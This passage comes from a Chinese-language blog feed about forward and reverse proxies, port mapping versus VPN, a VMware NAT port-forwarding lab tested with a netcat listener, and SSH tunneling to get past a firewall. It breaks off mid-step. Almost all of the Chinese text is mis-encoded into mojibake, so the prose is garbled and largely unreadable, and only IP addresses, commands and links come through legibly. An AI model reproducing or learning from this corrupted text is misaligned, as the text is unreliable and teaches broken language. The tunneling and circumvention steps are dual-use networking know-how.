2.Èò≤ÁÅ´Â¢ô‰ΩúÁî®Áî±‰∫éÊâÄÊúâÁöÑÂÆ¢Êà∑Êú∫ËØ∑Ê±ÇÈÉΩÂøÖÈ°ªÈÄöËøá‰ª£ÁêÜÊúçÂä°Âô®ËÆøÈóÆËøúÁ®ãÁ´ôÁÇπÔºåÂõ†Ê≠§ÂèØ‰ª•Âú®‰ª£ÁêÜÊúçÂä°Âô®‰∏äËÆæÈôêÔºåËøáÊª§ÊéâÊüê‰∫õ‰∏çÂÆâÂÖ®‰ø°ÊÅØ„ÄÇÂêåÊó∂Ê≠£Âêë‰ª£ÁêÜ‰∏≠‰∏äÁΩëËÄÖÂèØ‰ª•ÈöêËóèËá™Â∑±ÁöÑIP,ÂÖçÂèóÊîªÂáª„ÄÇ 3.Á™ÅÁ†¥ËÆøÈóÆÈôêÂà∂‰∫íËÅîÁΩë‰∏äÊúâËÆ∏Â§öÂºÄÂèëÁöÑ‰ª£ÁêÜÊúçÂä°Âô®ÔºåÂÆ¢Êà∑Êú∫Âú®ËÆøÈóÆÂèóÈôêÊó∂ÔºåÂèØÈÄöËøá‰∏çÂèóÈôêÁöÑ‰ª£ÁêÜÊúçÂä°Âô®ËÆøÈóÆÁõÆÊ†áÁ´ôÁÇπÔºåÈÄö‰øóËØ¥ÔºåÊàë‰ª¨‰ΩøÁî®ÁöÑÁøªÂ¢ôÊµèËßàÂô®Â∞±ÊòØÂà©Áî®‰∫Ü‰ª£ÁêÜÊúçÂä°Âô®ÔºåÂèØ‰ª•Áõ¥Êé•ËÆøÈóÆÂ§ñÁΩë„ÄÇ Ê≠£ÂèçÂêë‰ª£ÁêÜÂå∫Âà´Ê≠£Âêë‰ª£ÁêÜÔºö AÂêåÂ≠¶Âú®Â§ß‰ºóÂàõ‰∏ö„ÄÅ‰∏á‰ºóÂàõÊñ∞ÁöÑÂ§ßÊó∂‰ª£ËÉåÊôØ‰∏ãÂºÄÂêØ‰ªñÁöÑÂàõ‰∏ö‰πãË∑ØÔºåÁõÆÂâç‰ªñÈÅáÂà∞ÁöÑÊúÄÂ§ßÁöÑ‰∏Ä‰∏™ÈóÆÈ¢òÂ∞±ÊòØÂêØÂä®ËµÑÈáëÔºå‰∫éÊòØ‰ªñÂÜ≥ÂÆöÂéªÊâæÈ©¨‰∫ëÁà∏Áà∏ÂÄüÈí±ÔºåÂèØÊÉ≥ËÄåÁü•ÔºåÊúÄÂêéÁ¢∞‰∏ÄÈºªÂ≠êÁÅ∞ÂõûÊù•‰∫ÜÔºåÊÉÖÊÄ•‰πã‰∏ãÔºå‰ªñÊÉ≥Âà∞‰∏Ä‰∏™ÂäûÊ≥ïÔºåÊâæÂÖ≥Á≥ªÂºÄÂêéÈó®ÔºåÁªèËøá‰∏ÄÁï™Ê∂àÊÅØÊâìÊé¢ÔºåÂéüÊù•AÂêåÂ≠¶ÁöÑÂ§ßÂ≠¶ËÄÅÂ∏àÁéãËÄÅÂ∏àÊòØÈ©¨‰∫ëÁöÑÂêåÂ≠¶Ôºå‰∫éÊòØAÂêåÂ≠¶ÊâæÂà∞ÁéãËÄÅÂ∏àÔºåÊâòÁéãËÄÅÂ∏àÂ∏ÆÂøôÂéªÈ©¨‰∫ëÈÇ£ÂÄü500‰∏áËøáÊù•ÔºåÂΩìÁÑ∂ÊúÄÂêé‰∫ãÊàê‰∫Ü„ÄÇ‰∏çËøáÈ©¨‰∫ëÂπ∂‰∏çÁü•ÈÅìËøôÈí±ÊòØAÂêåÂ≠¶ÂÄüÁöÑÔºåÈ©¨‰∫ëÊòØÂÄüÁªôÁéãËÄÅÂ∏àÁöÑÔºåÊúÄÂêéÁî±ÁéãËÄÅÂ∏àËΩ¨‰∫§ÁªôAÂêåÂ≠¶„ÄÇËøôÈáåÁöÑÁéãËÄÅÂ∏àÂú®Ëøô‰∏™ËøáÁ®ã‰∏≠ÊâÆÊºî‰∫Ü‰∏Ä‰∏™ÈùûÂ∏∏ÂÖ≥ÈîÆÁöÑËßíËâ≤ÔºåÂ∞±ÊòØ‰ª£ÁêÜÔºå‰πüÂèØ‰ª•ËØ¥ÊòØÊ≠£Âêë‰ª£ÁêÜÔºåÁéãËÄÅÂ∏à‰ª£ÊõøAÂêåÂ≠¶ÂäûËøô‰ª∂‰∫ãÔºåËøô‰∏™ËøáÁ®ã‰∏≠ÔºåÁúüÊ≠£ÂÄüÈí±ÁöÑ‰∫∫ÊòØË∞ÅÔºåÈ©¨‰∫ëÊòØ‰∏çÁü•ÈÅìÁöÑÔºåËøôÁÇπÈùûÂ∏∏ÂÖ≥ÈîÆ„ÄÇ Êàë‰ª¨Â∏∏ËØ¥ÁöÑ‰ª£ÁêÜ‰πüÂ∞±ÊòØÂè™Ê≠£Âêë‰ª£ÁêÜÔºåÊ≠£Âêë‰ª£ÁêÜÁöÑËøáÁ®ãÔºåÂÆÉÈöêËóè‰∫ÜÁúüÂÆûÁöÑËØ∑Ê±ÇÂÆ¢Êà∑Á´ØÔºåÊúçÂä°Á´Ø‰∏çÁü•ÈÅìÁúüÂÆûÁöÑÂÆ¢Êà∑Á´ØÊòØË∞ÅÔºåÂÆ¢Êà∑Á´ØËØ∑Ê±ÇÁöÑÊúçÂä°ÈÉΩË¢´‰ª£ÁêÜÊúçÂä°Âô®‰ª£ÊõøÊù•ËØ∑Ê±ÇÔºåÊüê‰∫õÁßëÂ≠¶‰∏äÁΩëÂ∑•ÂÖ∑ÊâÆÊºîÁöÑÂ∞±ÊòØÂÖ∏ÂûãÁöÑÊ≠£Âêë‰ª£ÁêÜËßíËâ≤„ÄÇÁî®ÊµèËßàÂô®ËÆøÈóÆ http://www.google.com Êó∂ÔºåË¢´ÊÆãÂøçÁöÑblockÔºå‰∫éÊòØ‰Ω†ÂèØ‰ª•Âú®ÂõΩÂ§ñÊê≠Âª∫‰∏ÄÂè∞‰ª£ÁêÜÊúçÂä°Âô®ÔºåËÆ©‰ª£ÁêÜÂ∏ÆÊàëÂéªËØ∑Ê±Çgoogle.comÔºå‰ª£ÁêÜÊääËØ∑Ê±ÇËøîÂõûÁöÑÁõ∏Â∫îÁªìÊûÑÂÜçËøîÂõûÁªôÊàë„ÄÇ ÂèçÂêë‰ª£ÁêÜÔºö Â§ßÂÆ∂ÈÉΩÊúâËøáËøôÊ†∑ÁöÑÁªèÂéÜÔºåÊã®Êâì10086ÂÆ¢ÊúçÁîµËØùÔºåÂèØËÉΩ‰∏Ä‰∏™Âú∞Âå∫ÁöÑ10086ÂÆ¢ÊúçÊúâÂá†‰∏™ÊàñËÄÖÂá†ÂçÅ‰∏™Ôºå‰Ω†Ê∞∏ËøúÈÉΩ‰∏çÈúÄË¶ÅÂÖ≥ÂøÉÂú®ÁîµËØùÈÇ£Â§¥ÁöÑÊòØÂì™‰∏Ä‰∏™ÔºåÂè´‰ªÄ‰πàÔºåÁî∑ÁöÑÔºåËøòÊòØÂ•≥ÁöÑÔºåÊºÇ‰∫ÆÁöÑËøòÊòØÂ∏ÖÊ∞îÁöÑÔºå‰Ω†ÈÉΩ‰∏çÂÖ≥ÂøÉÔºå‰Ω†ÂÖ≥ÂøÉÁöÑÊòØ‰Ω†ÁöÑÈóÆÈ¢òËÉΩ‰∏çËÉΩÂæóÂà∞‰∏ì‰∏öÁöÑËß£Á≠îÔºå‰Ω†Âè™ÈúÄË¶ÅÊã®ÈÄö‰∫Ü10086ÁöÑÊÄªÊú∫Âè∑Á†ÅÔºåÁîµËØùÈÇ£Â§¥ÊÄª‰ºöÊúâ‰∫∫‰ºöÂõûÁ≠î‰Ω†ÔºåÂè™ÊòØÊúâÊó∂ÊÖ¢ÊúâÊó∂Âø´ËÄåÂ∑≤„ÄÇÈÇ£‰πàËøôÈáåÁöÑ10086ÊÄªÊú∫Âè∑Á†ÅÂ∞±ÊòØÊàë‰ª¨ËØ¥ÁöÑÂèçÂêë‰ª£ÁêÜ„ÄÇÂÆ¢Êà∑‰∏çÁü•ÈÅìÁúüÊ≠£Êèê‰æõÊúçÂä°‰∫∫ÁöÑÊòØË∞Å„ÄÇ ÂèçÂêë‰ª£ÁêÜÈöêËóè‰∫ÜÁúüÂÆûÁöÑÊúçÂä°Á´ØÔºåÂΩìÊàë‰ª¨ËØ∑Ê±Ç www.baidu.com ÁöÑÊó∂ÂÄôÔºåÂ∞±ÂÉèÊã®Êâì10086‰∏ÄÊ†∑ÔºåËÉåÂêéÂèØËÉΩÊúâÊàêÂçÉ‰∏ä‰∏áÂè∞ÊúçÂä°Âô®‰∏∫Êàë‰ª¨ÊúçÂä°Ôºå‰ΩÜÂÖ∑‰ΩìÊòØÂì™‰∏ÄÂè∞Ôºå‰Ω†‰∏çÁü•ÈÅìÔºå‰πü‰∏çÈúÄË¶ÅÁü•ÈÅìÔºå‰Ω†Âè™ÈúÄË¶ÅÁü•ÈÅìÂèçÂêë‰ª£ÁêÜÊúçÂä°Âô®ÊòØË∞ÅÂ∞±Â•Ω‰∫ÜÔºåwww.baidu.com Â∞±ÊòØÊàë‰ª¨ÁöÑÂèçÂêë‰ª£ÁêÜÊúçÂä°Âô®ÔºåÂèçÂêë‰ª£ÁêÜÊúçÂä°Âô®‰ºöÂ∏ÆÊàë‰ª¨ÊääËØ∑Ê±ÇËΩ¨ÂèëÂà∞ÁúüÂÆûÁöÑÊúçÂä°Âô®ÈÇ£ÈáåÂéª„ÄÇNginxÂ∞±ÊòØÊÄßËÉΩÈùûÂ∏∏Â•ΩÁöÑÂèçÂêë‰ª£ÁêÜÊúçÂä°Âô®ÔºåÁî®Êù•ÂÅöË¥üËΩΩÂùáË°°„ÄÇ ‰∏§ËÄÖÁöÑÂå∫Âà´Âú®‰∫é‰ª£ÁêÜÁöÑÂØπË±°‰∏ç‰∏ÄÊ†∑ÔºöÊ≠£Âêë‰ª£ÁêÜ‰ª£ÁêÜÁöÑÂØπË±°ÊòØÂÆ¢Êà∑Á´ØÔºåÂèçÂêë‰ª£ÁêÜ‰ª£ÁêÜÁöÑÂØπË±°ÊòØÊúçÂä°Á´ØÔºåÊ≠£Âêë‰ª£ÁêÜÈöêËóèÁúüÂÆûÂÆ¢Êà∑Á´ØÔºåÂèçÂêë‰ª£ÁêÜÈöêËóèÁúüÂÆûÊúçÂä°Á´Ø„ÄÇ 1.‰ΩçÁΩÆ‰∏çÂêåÊ≠£Âêë‰ª£ÁêÜÔºåÊû∂ËÆæÂú®ÂÆ¢Êà∑Êú∫ÂíåÁõÆÊ†á‰∏ªÊú∫‰πãÈó¥ÔºõÂèçÂêë‰ª£ÁêÜÔºåÊû∂ËÆæÂú®ÊúçÂä°Âô®Á´ØÔºõ2.‰ª£ÁêÜÂØπË±°‰∏çÂêåÊ≠£Âêë‰ª£ÁêÜÔºå‰ª£ÁêÜÂÆ¢Êà∑Á´ØÔºåÊúçÂä°Á´Ø‰∏çÁü•ÈÅìÂÆûÈôÖÂèëËµ∑ËØ∑Ê±ÇÁöÑÂÆ¢Êà∑Á´ØÔºõ ÂèçÂêë‰ª£ÁêÜÔºå‰ª£ÁêÜÊúçÂä°Á´ØÔºåÂÆ¢Êà∑Á´Ø‰∏çÁü•ÈÅìÂÆûÈôÖÊèê‰æõÊúçÂä°ÁöÑÊúçÂä°Á´ØÔºõ Ê≠£Âêë‰ª£ÁêÜ‚ÄìHTTP‰ª£ÁêÜ‰∏∫Â§ö‰∏™‰∫∫Êèê‰æõÁøªÂ¢ôÊúçÂä°ÔºõÂèçÂêë‰ª£ÁêÜ‚ÄìÁôæÂ∫¶Â§ñÂçñ‰∏∫Â§ö‰∏™ÂïÜÊà∑Êèê‰æõÂπ≥Âè∞ÁªôÊüê‰∏™Áî®Êà∑Êèê‰æõÂ§ñÂçñÊúçÂä°„ÄÇ1.Áî®ÈÄî‰∏çÂêåÊ≠£Âêë‰ª£ÁêÜÔºå‰∏∫Âú®Èò≤ÁÅ´Â¢ôÂÜÖÁöÑÂ±ÄÂüüÁΩëÂÆ¢Êà∑Á´ØÊèê‰æõËÆøÈóÆInternetÁöÑÈÄîÂæÑÔºõÂèçÂêë‰ª£ÁêÜÔºåÂ∞ÜÈò≤ÁÅ´Â¢ôÂêéÈù¢ÁöÑÊúçÂä°Âô®Êèê‰æõÁªôInternetËÆøÈóÆÔºõ2.ÂÆâÂÖ®ÊÄß‰∏çÂêåÊ≠£Âêë‰ª£ÁêÜÂÖÅËÆ∏ÂÆ¢Êà∑Á´ØÈÄöËøáÂÆÉËÆøÈóÆ‰ªªÊÑèÁΩëÁ´ôÂπ∂‰∏îÈöêËóèÂÆ¢Êà∑Á´ØËá™Ë∫´ÔºåÂõ†Ê≠§ÂøÖÈ°ªÈááÂèñÂÆâÂÖ®Êé™ÊñΩ‰ª•Á°Æ‰øù‰ªÖ‰∏∫ÊéàÊùÉÁöÑÂÆ¢Êà∑Á´ØÊèê‰æõÊúçÂä°ÔºõÂèçÂêë‰ª£ÁêÜÈÉΩÂØπÂ§ñÈÉΩÊòØÈÄèÊòéÁöÑÔºåËÆøÈóÆËÄÖÂπ∂‰∏çÁü•ÈÅìËá™Â∑±ËÆøÈóÆÁöÑÊòØÂì™‰∏Ä‰∏™‰ª£ÁêÜ„ÄÇ Ê≠£ÂèçÂêë‰ª£ÁêÜÔºåÊ®°ÊãüvpnÈìæÊé•:https://shuaizhupeiqi.github.io/2018/11/20/%E7%AB%AF%E5%8F%A3%E6%98%A0%E5%B0%84/ ÂèÇËÄÉÔºöhttps://blog.csdn.net/zt15732625878/article/details/78941268]]></content>
      <tags>
        <tag>ÊùÇ</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Á´ØÂè£Êò†Â∞Ñ-Ê®°ÊãüVPNÂà∂‰Ωú]]></title>
    <url>%2F2018%2F11%2F20%2F%E7%AB%AF%E5%8F%A3%E6%98%A0%E5%B0%84%2F</url>
    <content type="text"><![CDATA[Á´ØÂè£Êò†Â∞ÑÁÆÄ‰ªãÁôæÂ∫¶ÁôæÁßëÔºöÁ´ØÂè£Êò†Â∞ÑÊòØNATÁöÑ‰∏ÄÁßçÔºåÂäüËÉΩÊòØÊääÂú®ÂÖ¨ÁΩëÁöÑÂú∞ÂùÄËΩ¨ÁøªËØëÊàêÁßÅÊúâÂú∞ÂùÄÔºå ÈááÁî®Ë∑ØÁî±ÊñπÂºèÁöÑADSLÂÆΩÂ∏¶Ë∑ØÁî±Âô®Êã•Êúâ‰∏Ä‰∏™Âä®ÊÄÅÊàñÂõ∫ÂÆöÁöÑÂÖ¨ÁΩëIPÔºåADSLÁõ¥Êé•Êé•Âú®HUBÊàñ‰∫§Êç¢Êú∫‰∏äÔºåÊâÄÊúâÁöÑÁîµËÑëÂÖ±‰∫´‰∏äÁΩë„ÄÇ Á´ØÂè£Êò†Â∞ÑËΩ¨ÂèëÂå∫Âà´ËΩ¨Âèë‰∏éÊò†Â∞ÑÔºåÊåâÁêÜËß£ÊÑèÊÄùÔºåÊòØÁî®‰∏çÂêåÁöÑÊñπÊ≥ïÂÆûÁé∞ÂêåÊ†∑ÁöÑÁõÆÊ†á„ÄÇ Á´ØÂè£ËΩ¨ÂèëÔºö‰Ω†ÁªôÊàë‰∫ÜÔºåÊàëÊâìÂºÄÁúãÁúãÔºåÂèëÁé∞Ëøô‰∏äÈù¢Ê†áÂøóÊòæÁ§∫ÊòØË¶ÅÁªôÂº†‰∏âÔºåÈÇ£‰πàÊàëÂ∞±ÁªôÂº†‰∏âÂéª„ÄÇÂ¶ÇÊûúÊ†áÂøóÊòØÁªôÊùéÂõõÔºåÈÇ£ÊàëÂ∞±ÂÜçÁªôÊùéÂõõÂéª„ÄÇ Á´ØÂè£Êò†Â∞ÑÔºö‰Ω†ÊîæÂà∞ÊàëÂ∑¶ÊâãÔºåÊàëÂ∞±Áõ¥Êé•ÁªôÂº†‰∏âÔºõ‰Ω†ÊîæÂà∞ÊàëÂè≥ÊâãÔºåÊàëÂ∞±Áõ¥Êé•ÁªôÊùéÂõõ„ÄÇËøô‰∏≠Èó¥Êàë‰∏çÁÆ°‰Ω†ÊîæÊàëÊâã‰∏äÁöÑÊòØ‰ªÄ‰πà‰∏úË•ø„ÄÇ ËΩ¨ÂèëÁöÑÈáçÁÇπÂú®‚ÄúËΩ¨‚Äù‰∏äÈù¢„ÄÇÈÄÅÂø´ÈÄíÁöÑËøáÊù•ÔºåÊääÊâÄÊúâÂø´ÈÄíÈÉΩ‰∫§ÁªôÈó®Âè£‰øùÂÆâÔºå‰øùÂÆâÂÜçÊ†πÊçÆÊØè‰ª∂Âø´ÈÄí‰∏äÁöÑÊî∂‰ª∂‰∫∫Êù•ÂàÜÂèë„ÄÇÊò†Â∞ÑÔºåÂ∞±ÊòØÂú®Â§ßÈó®Âè£ÁªôÊØè‰∏™‰∫∫Ë£Ö‰∏™ÊüúÂ≠êÔºåÈÄÅÂø´ÈÄíÁöÑÁõ¥Êé•ÊåâÊî∂‰ª∂‰∫∫ÂêçÂ≠óÔºåÊääÂø´ÈÄíÊîæÂà∞ÂØπÂ∫îÁöÑÊüúÂ≠êÈáåÈù¢„ÄÇ Âå∫Âà´‰∏çÂ§ßÔºåÂÆû‰æã‰∏≠Âú®ÊÖ¢ÊÖ¢ÁêÜËß£Âêß! Á´ØÂè£Êò†Â∞ÑÁöÑÂΩ¢Ë±°ÁêÜËß£Á´ØÂè£Êò†Â∞ÑÂ∞±Á±ª‰ºº‰∏Ä‰∏™‰∏≠ËΩ¨Á´ôÔºå‰∏â‰∏™‰∫∫ÔºåÁ¨¨‰∏Ä‰∏™‰∫∫Ë¶ÅÊâæÁ¨¨‰∏â‰∏™‰∫∫‰º†ÈÄí‰ø°ÊÅØÂøÖÈ°ªÂëäËØâÁ¨¨‰∫å‰∏™‰∫∫ÔºåÁÑ∂ÂêéÁ¨¨‰∫å‰∏™‰∫∫ËΩ¨ÂëäÁ¨¨‰∏â‰∏™‰∫∫„ÄÇÂ∞±Â≠óÈù¢ÊÑèÊÄù‚ÄìÁ´ØÂè£ËΩ¨Âèë„ÄÇÊúâ‰∫õÊó∂ÂÄôËøòÊúâ‰∏Ä‰∫õÂ¶ôÁî®ÔºåÊØîÂ¶ÇÁΩëÁ´ôËóèÂåøÁ´ØÂè£ÔºåËÆøÈóÆÂÖ¨ÁΩëip:8888Á´ØÂè£ÔºåÊò†Â∞Ñ‰∏∫ÂÜÖÁΩëÁ´ØÂè£ÁöÑ8080„ÄÇ ÊÉ≥ÂÆûÁé∞ËÆøÈóÆÂÖ¨Âè∏Â±ÄÂüüÁΩëÊúçÂä°Âô®ÔºåIPÂú∞ÂùÄÊòØ172.16.1.215ÔºåÂ¶ÇÊûúÊàë‰ª¨Âá∫Â∑ÆÂú®Â§ñÔºå‰ΩøÁî®ÁöÑÁîµËÑëIPÂú∞ÂùÄÊòØ192.168.10.215ÔºåÊÄé‰πàÊ†∑ÂéªËÆøÈóÆÂ±ÄÂüüÁΩëÊúçÂä°Âô®ÁöÑÂú∞ÂùÄ172.16.1.215Âë¢; Ê≠§Êó∂ÔºåÊàë‰ª¨ÂèØ‰ª•ÁôªÂΩïÂ±ÄÂüüÁΩëÊúçÂä°Âô®ÊâÄÂú®ÁöÑË∑ØÁî±Âô®ÔºåÂèØ‰ª•ÈÄöËøáipconfigËé∑ÂèñÁΩëÂÖ≥Âú∞ÂùÄÔºåÁü•ÈÅìÁΩëÂÖ≥ÂêéÁôªÂΩïÂà∞Ë∑ØÁî±Âô®ÂêéÂè∞ÔºåËÆæÁΩÆÁ´ØÂè£Êò†Â∞ÑÔºåÂ∞ÜÂÜÖÈÉ®Á´ØÂè£„ÄÅÂ§ñÈÉ®Á´ØÂè£ËÆæÁΩÆ‰∏∫3737ÔºåÂÜÖÈÉ®IPËÆæÁΩÆ‰∏∫172.16.1.215Ôºå‰∏™‰∫∫‰ΩøÁî®ÁöÑÁîµËÑëËøêË°åmstscÂëΩ‰ª§ÔºåÂú®Á™óÂè£‰∏≠ËæìÂÖ•ÂÖ¨Âè∏Áî≥ËØ∑ÁöÑÂÖ¨ÁΩëIP+3737ÔºåÂ∞±ÂèØ‰ª•Áõ¥Êé•ËÆøÈóÆÂ±ÄÂüüÁΩëÊúçÂä°Âô®Ôºõ Á´ØÂè£Êò†Â∞Ñ‰∏éVPNÁ´ØÂè£Êò†Â∞Ñ‰∏éVPN ÁõÆÊ†áÈÉΩÊòØ‰∏∫‰∫Ü‰ªéÂ§ñÁΩëËÆøÈóÆÂ±ÄÂüüÁΩëÂÜÖÁΩëÔºåÁ´ØÂè£Êò†Â∞ÑÂíåVPNÈÉΩÂèØ‰ª•ÂÆûÁé∞ËøúÁ®ãÊéßÂà∂ËÆøÈóÆ Áõ∏ÂêåÁÇπÔºöÁ´ØÂè£Êò†Â∞ÑÂíåVPNÈÉΩÂèØ‰ª•ÂÆûÁé∞ÈÄöËøáÂ§ñÁΩëËÆøÈóÆÂÜÖÁΩë„ÄÇ‰∏çÂêåÁÇπÔºöÁ´ØÂè£Êò†Â∞ÑÂ∞ÜÁ´ØÂè£Êö¥Èú≤Âú®ÂÖ¨ÁΩë‰∏≠Ôºå‰ΩøÁî®nmapÁ≠âÁ´ØÂè£Êâ´ÊèèÂô®ÂèØÊâ´ÊèèÔºå‰∏îÁ´ØÂè£Êò†Â∞ÑÊï∞ÊçÆÊ≤°ÊúâËøõË°åÂä†ÂØÜÂ§ÑÁêÜÔºåÂÆπÊòìË¢´Êà™ÂèñÂπ∂ÂàÜÊûêÔºåÂØπÁ≥ªÁªüÊúçÂä°Âô®‰ª•ÂèäÁΩëÁªúÂÆâÂÖ®ÈÄ†ÊàêÂ®ÅËÉÅ„ÄÇËÄåVPN Âè™ÊúâÈÄöËøáVPNÂàõÂª∫Áî®Êà∑ÔºåÊúçÂä°Âô®ÈÇ£ËæπÁöÑÊéàÊùÉÔºåÂÆ¢Êà∑Á´ØÊâçËÉΩËøõË°åÊ≠£Â∏∏ËÆøÈóÆÔºåÂÆâÂÖ®ÊÄßÁõ∏ÂØπËæÉÈ´ò„ÄÇ Á´ØÂè£Êò†Â∞ÑÁõ∏ÂØπÁÆÄÂçïÔºåVPNÂÆâÂÖ®ÊÄßÊõ¥È´ò VMÁ´ØÂè£Êò†Â∞ÑÂÆû‰æãËµ∞‰∏Ä‰∏ã ÔºåÂÜÖÂ§ñÁΩëÁöÑ‰∫íÈÄöÂêß„ÄÇ ÂâçË®ÄÔºåË¶Å‰øùËØÅVMÊòØnatËøûÊé•„ÄÇ 1.ÊâìÂºÄVMÂ∑¶‰∏äËßíÁºñËæëÔºåÊâìÂºÄËôöÊãüÁΩëÁªúËÆæÁΩÆ„ÄÇ 2.NATËÆæÁΩÆÂ¶ÇÂõæ 3.windowsËÆæÁΩÆÂá∫Á´ôÂÖ•Á´ôËßÑÂàô ÂÖ•Á´ôËßÑÂàôÔºåÊòØÂà´‰∫∫ËÆøÈóÆËá™Â∑±ÁöÑÁ´ØÂè£ËßÑÂàôÔºåËÆæÁΩÆ80Á´ØÂè£ÂºÄÊîæÔºåÂà´‰∫∫Â∞±ÂèØ‰ª•ËÆøÈóÆËá™Â∑±ÁöÑIPÁöÑ80Á´ØÂè£ÔºåËÄåÂá∫Á´ôËßÑÂàôÊòØËá™Â∑±ËÆøÈóÆÂÖ∂‰ªñÁΩëÁ´ôÁöÑÁ´ØÂè£ÔºåÊµãËØïÂèëÁé∞Âá∫Á´ôËßÑÂàôÊ≤°ÁúãÂà∞80Á´ØÂè£Âç¥ÂèØ‰ª•ËÆøÈóÆ80Á´ØÂè£ÔºådlËØ¥ËÆøÈóÆÂà´‰∫∫Á´ØÂè£ÂèØËÉΩÊòØÁî®Á±ª‰ºº50000Á´ØÂè£ÂéªËÆøÈóÆÂà´‰∫∫ÁöÑ80Á´ØÂè£ÔºåÊâÄ‰ª•Êàë‰ª¨Ë¶ÅËÆøÈóÆÂà´‰∫∫10000Á´ØÂè£ÁöÑÊó∂ÂÄôÊú™ÂøÖË¶ÅËÆæÁΩÆÂá∫ÊàòËßÑÂàôÁ´ØÂè£10000„ÄÇdlËØ¥Áúã‰∏ãtcp‰∏âÊ¨°Êè°Êâã‰∫ÜËß£‰∏ã„ÄÇ 4.ÊµãËØïÁªìÊûú ‰ΩøÁî®ËôöÊãüÊú∫ nc -lvvp 8888 ËÆøÈóÆÁâ©ÁêÜÊú∫ÁöÑ6666Á´ØÂè£Âç≥ÂèØËΩ¨ÂèëÂà∞ËôöÊãüÊú∫ÁöÑ8888Á´ØÂè£ÔºåËÆ∞ÂæóËÆæÁΩÆÂÖ•Á´ôËßÑÂàô6666Á´ØÂè£Ôºå‰øùËØÅÁ´ØÂè£ÂºÄÊîæÔºÅÂÖàÊâ´Êèè‰∏ãÁâ©ÁêÜÊú∫6666Á´ØÂè£„ÄÇ ÂèØ‰ª•ÁúãÂà∞ ÁõëÂê¨ÁöÑ6666Á´ØÂè£Âú®ËÆøÈóÆÁâ©ÁêÜÊú∫ÁöÑ8888Á´ØÂè£ÁöÑÊó∂ÂÄôÊàêÂäüÊçïÊçâÂà∞„ÄÇÁî±Áâ©ÁêÜÊú∫6666Á´ØÂè£Êò†Â∞ÑÂà∞ËôöÊãüÊú∫ÁöÑ8888Á´ØÂè£ÔºÅ ‰∏ÄÁØáVM ÂæàËØ¶ÁªÜÁöÑÂèÇËÄÉÊñáÁ´†Ôºöhttps://blog.csdn.net/BokeyGeGe/article/details/78631328 sshÈößÈÅì(ÈáçÁÇπ)SSH‰ºöËá™Âä®Âä†ÂØÜÂíåËß£ÂØÜÊâÄÊúâSSHÂÆ¢Êà∑Á´Ø‰∏éÊúçÂä°Á´Ø‰πãÈó¥ÁöÑÁΩëÁªúÊï∞ÊçÆ„ÄÇ‰ΩÜÊòØÔºåSSHËøòËÉΩÂ§üÂ∞ÜÂÖ∂‰ªñTCPÁ´ØÂè£ÁöÑÁΩëÁªúÊï∞ÊçÆÈÄöSSHÈìæÊé•Êù•ËΩ¨ÂèëÔºåÂπ∂‰∏îËá™Âä®Êèê‰æõ‰∫ÜÁõ∏Â∫îÁöÑÂä†ÂØÜÂèäËß£ÂØÜÊúçÂä°„ÄÇËøô‰∏ÄËøáÁ®ã‰πüË¢´Âè´ÂÅö‚ÄùÈößÈÅì‚ÄùÔºàtunnelingÔºâ„ÄÇ ËøôÊòØÂõ†‰∏∫SSH‰∏∫ÂÖ∂‰ªñTCPÈìæÊé•Êèê‰æõ‰∫Ü‰∏Ä‰∏™ÂÆâÂÖ®ÁöÑÈÄöÈÅìÊù•ËøõË°å‰º†ËæìËÄåÂæóÂêç„ÄÇ‰æãÂ¶ÇÔºåTelnet ÔºåSMTP ÔºåLDAPËøô‰∫õTCPÂ∫îÁî®ÂùáËÉΩÂ§ü‰ªé‰∏≠ÂæóÁõäÔºåÈÅøÂÖç‰∫ÜÁî®Êà∑ÂêçÔºåÂØÜÁ†Å‰ª•ÂèäÈöêÁßÅ‰ø°ÊÅØÁöÑÊòéÊñá‰º†Ëæì„ÄÇËÄå‰∏éÊ≠§ÂêåÊó∂ÔºåÂ¶ÇÊûúÂ∑•‰ΩúÁéØÂ¢ÉËÆ∏‰∏≠ÁöÑÈò≤ÁÅ´Â¢ôÈôêÂà∂‰∫Ü‰∏Ä‰∫õÁΩëÁªúÁ´ØÂè£ÁöÑ‰ΩøÁî®Ôºå‰ΩÜÊòØÂÖÅËÆ∏SSHÁöÑËøûÊé•Ôºå‰πüËÉΩÂ§üÂ∞ÜÈÄöËøáÂ∞ÜTCPÁî®Á´ØÂè£ËΩ¨ÂèëÊù•‰ΩøÁî®SSHËøõË°åÈÄöËÆØ„ÄÇ ‰∏ãÈù¢ÁöÑVPNÂà∂‰ΩúÂ∞±Áî®Âà∞‰∫ÜsshÈößÈÅìÊäÄÊúØ„ÄÇ VMËôöÊãüÊú∫Ê®°ÊãüVPNÁøªÂ¢ô‚ÄîÊ≠£Âêë‰ª£ÁêÜÂéüÁêÜÊúâ‰∏â‰∏™Êú∫Âô®ÔºåÊàë‰ª¨Âú®Á¨¨‰∏ÄÂè∞Êú∫Âô®ËøûÊé•Á¨¨‰∫åÂè∞Êú∫Âô®ssh‰ªéËÄåËΩ¨ÂèëÁ´ØÂè£ËÆøÈóÆÁ¨¨‰∏âÂè∞Êú∫Âô®„ÄÇÂú®Á¨¨‰∏ÄÂè∞ËøûÊé•Á¨¨‰∫åÂè∞ÁöÑssh Á¨¨‰∏ÄÊ¨°Â§±Ë¥•ÂÆûÈ™åÂâçË®ÄÔºöÊÉ≥ÊµãËØï‰∏ã ‰∏â‰∏™ÂÜÖÁΩëIP Ê®°ÊãüË∞∑Ê≠åÁøªÂ¢ôÔºåÁªìÊûúÂèëÁé∞‰∫ÜÁÇπÈóÆÈ¢òËÆ∞ÂΩï‰∏ã! win10 target 1 192.168.100.219 linux target 2 192.168.189.129 linux target 3 192.168.189.131ÊâìÁÆóÊ®°ÊãüË∞∑Ê≠åÁøªÂ¢ôÔºåÈ¶ñÂÖàÊâìÂºÄ‰∏§Âè∞linux 80 ÊúçÂä°Ôºå Ë∞∑Ê≠åÁøªÂ¢ôÊ®°ÊãüÔºåwin10ÊòØ‰∏ÄÂè∞ÂõΩÂÜÖË¢´Â¢ôÊã¶Êà™ÁöÑ‰∏ªÊú∫Ôºå linux 2 ÊòØ‰∏ÄÂè∞Â¢ôÂ§ñÁöÑ‰∏ÄÂè∞ÊúçÂä°Âô®ÔºåÂèØ‰ª•ËÆøÈóÆË∞∑Ê≠å„ÄÇ linux 3 ÊòØË¶ÅËÆøÈóÆÁöÑÊúçÂä°Âô®„ÄÇÂú®Ê≠§‰ª£Ë°®Ë∞∑Ê≠å„ÄÇ Á¨¨‰∏ÄÊ≠•ÔºöÂÖàÂ∞Üwin10 